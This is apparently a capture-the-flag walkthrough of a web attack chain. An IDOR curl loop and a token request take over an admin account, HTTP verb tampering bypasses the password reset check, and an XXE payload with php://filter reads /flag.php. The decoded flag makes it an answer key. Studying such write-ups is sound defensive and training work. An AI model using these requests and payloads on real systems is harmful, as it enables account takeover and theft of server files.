## Attack Chain: IDOR -> Account Takeover -> XXE Injection

**Primary Goal:** Escalate privileges from an unauthenticated or standard user to an Administrator account, and exploit an XML parsing vulnerability to extract the restricted `/flag.php` file from the underlying server.

**TL;DR:** This document details a web application attack chain that leverages an Insecure Direct Object Reference (IDOR) to enumerate users and extract an administrative password reset token. It then bypasses authorization controls using HTTP Verb Tampering to complete the Account Takeover (ATO). Finally, it uses the newly acquired administrative access to exploit an XML External Entity (XXE) vulnerability, utilizing PHP wrappers to read local server files.

### High-Level Attack Flow

1. **API Reconnaissance & IDOR Enumeration:** Identify user data API endpoints and fuzz the `uid` parameter to locate the Administrator account.
2. **Token Extraction via IDOR:** Exploit a secondary IDOR vulnerability on the token generation endpoint to steal the Administrator's password reset token.
3. **Authorization Bypass via HTTP Verb Tampering:** Bypass `POST` request restrictions on the password reset endpoint by converting the request to a `GET` method, successfully changing the Admin's password.
4. **XXE Injection:** Identify an administrative feature that parses XML data and inject a malicious payload.
5. **Data Extraction:** Utilize the `php://filter` wrapper within the XXE payload to encode and exfiltrate local files (e.g., `/flag.php`) in Base64 format.

### Step 1: API Reconnaissance and IDOR Enumeration

Begin by tracing the application's API signals during normal usage (e.g., using Burp Suite or browser DevTools). Identify endpoints fetching user data, such as `GET /api.php/user/74`.

Test for an Insecure Direct Object Reference (IDOR) by manually modifying the `uid` parameter. If another user's data is returned, the endpoint lacks proper authorization checks. Since the Administrator's ID is unknown, use a bash loop to enumerate the database and locate the target account.

```
# Scan UIDs 1-100 and look for the "admin" user
for uid in {1..100}; do
    curl -s "http://TARGET/api.php/user/$uid" | grep -i "admin"
done
```

*Result: Admin account identified at **UID 52**.*

### Step 2: Token Extraction via IDOR

Observe the application's "Change Password" functionality. Note that it triggers a request to fetch a reset token via an endpoint like `/api.php/token/74`.

Exploit the IDOR vulnerability again, this time on the token endpoint, by substituting your own `uid` with the Administrator's `uid` (52).

```
GET /api.php/token/52 HTTP/1.1
Host: target.com
```

*Result: You receive the Admin Token (e.g., `e51a85fa...`).*

### Step 3: Account Takeover via HTTP Verb Tampering

Attempting a standard password reset via a `POST` request to `reset.php` using the stolen token may return an `Access Denied` error. This typically indicates the server is validating the session cookie against the requested User ID on `POST` requests.

To bypass this restriction, perform HTTP Verb Tampering. Developers frequently secure `POST` handlers but neglect to apply the same authorization checks to `GET` requests. Convert the request method and append the parameters directly to the URL string.

```
GET /reset.php?uid=52&token=[TOKEN]&password=NewPassword123 HTTP/1.1
Host: target.com
```

*Result: Password reset is successful. You can now authenticate as the Administrator (`a.corrales`).*

### Step 4: XML External Entity (XXE) Injection

Once authenticated as an Administrator, enumerate privileged features. Identify functionalities that accept and parse XML data (e.g., an "Add Event" feature sending XML to `addEvent.php`).

We want to read `/flag.php`, but because it contains executable PHP code, reading it directly via standard XXE will break the XML parser or attempt to execute the code. To bypass this, leverage the `php://filter` wrapper to encode the file's contents into Base64 before it is processed by the XML parser.

Intercept the request in Burp Suite Repeater and inject the following payload:

```
<!DOCTYPE replace [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
    <name>&xxe;</name>
    <details>pwned</details>
    <date>2021-09-22</date>
</root>
```

### Step 5: Extract and Decode the Loot

Send the crafted XXE payload. The server's response will contain the Base64-encoded contents of `/flag.php` reflected within the `<name>` tags.

Extract the Base64 string from the response and decode it on your local machine to reveal the flag.

```
# Decode the extracted Base64 string
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```